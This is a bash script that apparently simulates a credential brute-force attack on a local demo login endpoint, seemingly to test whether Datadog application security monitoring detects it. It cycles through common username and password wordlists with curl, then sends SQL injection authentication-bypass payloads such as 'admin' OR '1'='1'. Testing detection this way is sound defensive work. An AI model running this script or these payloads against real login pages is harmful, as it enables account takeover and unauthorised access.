#!/bin/bash

# Login Brute Force Simulation Script
# Target: http://localhost:3000/auth/login

TARGET_URL="http://localhost:3000/auth/login"
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}======================================${NC}"
echo -e "${BLUE}  Login Brute Force Attack Simulation${NC}"
echo -e "${BLUE}  Target: ${TARGET_URL}${NC}"
echo -e "${BLUE}======================================${NC}"
echo ""

# Random usernames to try
USERNAMES=(
    "admin"
    "administrator"
    "root"
    "user"
    "test"
    "demo"
    "guest"
    "operator"
    "manager"
    "superuser"
    "webadmin"
    "sysadmin"
    "dbadmin"
    "support"
    "pizza_admin"
    "john"
    "jane"
    "alice"
    "bob"
    "charlie"
    "david"
    "emily"
    "frank"
    "grace"
    "henry"
    "admin123"
    "pizzauser"
    "coffeeadmin"
    "testuser"
    "developer"
)

# Common passwords to try
PASSWORDS=(
    "admin"
    "password"
    "123456"
    "12345678"
    "admin123"
    "password123"
    "root"
    "qwerty"
    "letmein"
    "welcome"
    "monkey"
    "dragon"
    "master"
    "sunshine"
    "princess"
    "football"
    "iloveyou"
    "trustno1"
    "abc123"
    "passw0rd"
    "admin@123"
    "test123"
    "guest"
    "user123"
    "pizza123"
    "coffee123"
    "changeme"
    "default"
    "1234"
    "pass"
)

ATTEMPT_COUNT=0
SUCCESS_COUNT=0
FAILED_COUNT=0

echo -e "${YELLOW}[INFO]${NC} Starting brute force attack with ${#USERNAMES[@]} usernames and ${#PASSWORDS[@]} passwords"
echo -e "${YELLOW}[INFO]${NC} Total combinations: $((${#USERNAMES[@]} * ${#PASSWORDS[@]}))"
echo -e "${YELLOW}[INFO]${NC} Attack will be throttled to avoid overwhelming the server"
echo ""

# Function to attempt login
attempt_login() {
    local username=$1
    local password=$2

    ATTEMPT_COUNT=$((ATTEMPT_COUNT + 1))

    # Make the login request
    RESPONSE=$(curl -s -X POST "$TARGET_URL" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: Mozilla/5.0 (compatible; BruteForce/1.0)" \
        -d "username=${username}&password=${password}" \
        -w "\n%{http_code}" \
        -L \
        --max-time 10 \
        2>/dev/null)

    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | head -n-1)

    # Check if login was successful
    if [[ $HTTP_CODE == "302" ]] || echo "$BODY" | grep -qi "menu\|dashboard\|welcome"; then
        echo -e "${GREEN}[✓ SUCCESS]${NC} Username: ${username} | Password: ${password} | HTTP: ${HTTP_CODE}"
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        echo "[SUCCESS] $username:$password" >> /tmp/brute-force-results.txt
    else
        if [ $((ATTEMPT_COUNT % 10)) -eq 0 ]; then
            echo -e "${RED}[✗]${NC} Attempt ${ATTEMPT_COUNT} - Username: ${username} | Password: ${password} | HTTP: ${HTTP_CODE}"
        fi
        FAILED_COUNT=$((FAILED_COUNT + 1))
    fi

    # Throttle requests (0.1 second delay between attempts)
    sleep 0.1
}

# Clear previous results
> /tmp/brute-force-results.txt

echo -e "${BLUE}==== Starting Brute Force Attack ====${NC}"
echo ""

# Try common username/password combinations first
echo -e "${YELLOW}[PHASE 1]${NC} Testing common credential combinations..."

# Common same-username-password combinations
for username in "${USERNAMES[@]}"; do
    attempt_login "$username" "$username"
done

# Common default credentials
attempt_login "admin" "admin"
attempt_login "admin" "password"
attempt_login "admin" "admin123"
attempt_login "root" "root"
attempt_login "root" "toor"
attempt_login "test" "test"
attempt_login "guest" "guest"

echo ""
echo -e "${YELLOW}[PHASE 2]${NC} Testing password variations for common usernames..."

# Focus on likely admin accounts with common passwords
for username in "admin" "administrator" "root" "pizza_admin" "webadmin"; do
    for password in "${PASSWORDS[@]}"; do
        attempt_login "$username" "$password"
    done
done

echo ""
echo -e "${YELLOW}[PHASE 3]${NC} Testing random username/password combinations..."

# Random sampling of other combinations (to reduce total attempts)
for i in {1..50}; do
    # Pick random username and password
    RANDOM_USER=${USERNAMES[$RANDOM % ${#USERNAMES[@]}]}
    RANDOM_PASS=${PASSWORDS[$RANDOM % ${#PASSWORDS[@]}]}
    attempt_login "$RANDOM_USER" "$RANDOM_PASS"
done

echo ""
echo -e "${YELLOW}[PHASE 4]${NC} Testing SQL injection authentication bypass..."

# SQL injection attempts
attempt_login "admin' OR '1'='1" "anything"
attempt_login "admin'--" "anything"
attempt_login "admin' OR 1=1--" "anything"
attempt_login "' OR '1'='1" "' OR '1'='1"
attempt_login "admin' #" "anything"
attempt_login "' OR 1=1--" "anything"
attempt_login "1' OR '1'='1" "1' OR '1'='1"
attempt_login "admin' OR 'a'='a" "admin' OR 'a'='a"

echo ""
echo -e "${BLUE}======================================${NC}"
echo -e "${BLUE}  Brute Force Attack Summary${NC}"
echo -e "${BLUE}======================================${NC}"
echo ""
echo -e "Total Attempts:     ${ATTEMPT_COUNT}"
echo -e "${GREEN}Successful Logins:  ${SUCCESS_COUNT}${NC}"
echo -e "${RED}Failed Attempts:    ${FAILED_COUNT}${NC}"
echo ""

if [ $SUCCESS_COUNT -gt 0 ]; then
    echo -e "${GREEN}[!] Successful credentials found:${NC}"
    cat /tmp/brute-force-results.txt
    echo ""
else
    echo -e "${YELLOW}[!] No successful logins found${NC}"
fi

echo -e "${YELLOW}[INFO]${NC} Full results saved to: /tmp/brute-force-results.txt"
echo -e "${YELLOW}[INFO]${NC} Check Datadog ASM for detected brute force attempts"
echo ""
echo -e "${BLUE}Brute force simulation complete!${NC}"
